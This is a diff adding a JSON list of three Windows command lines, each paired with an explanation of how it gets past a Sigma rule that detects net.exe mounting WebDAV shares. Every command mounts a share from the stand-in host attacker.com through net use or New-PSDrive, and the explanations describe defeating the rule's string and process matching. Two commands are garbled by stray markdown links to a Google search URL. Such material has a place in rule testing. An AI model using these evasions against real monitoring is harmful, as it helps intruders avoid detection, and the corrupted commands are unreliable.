@@ -1,0 +1,14 @@
+[
+  {
+    "output": "net use Z: \\\\attacker.com@80\\share",
+    "explanation": "Windows WebClient service allows mounting WebDAV shares using UNC path syntax with the @port designation instead of explicitly defining an HTTP URL. This completely avoids the ' http' string required by the Sigma rule while still using net.exe to mount the WebDAV share."
+  },
+  {
+    "output": "New-PSDrive -Name Z -PSProvider FileSystem -Root \"[http://attacker.com/share](https://www.google.com/search?q=http://attacker.com/share)\"",
+    "explanation": "Using PowerShell's New-PSDrive cmdlet achieves the same objective (mounting a WebDAV share) but utilizes powershell.exe instead of net.exe or net1.exe, bypassing the Image and OriginalFileName selection criteria entirely."
+  },
+  {
+    "output": "net use Z:\"[http://attacker.com/share](https://www.google.com/search?q=http://attacker.com/share)\"",
+    "explanation": "The Sigma rule's CommandLine selection specifically looks for the string ' http' (with a leading space). By removing the space between the drive letter/colon and the HTTP URL, the exact string match fails, successfully bypassing the detection."
+  }
+]
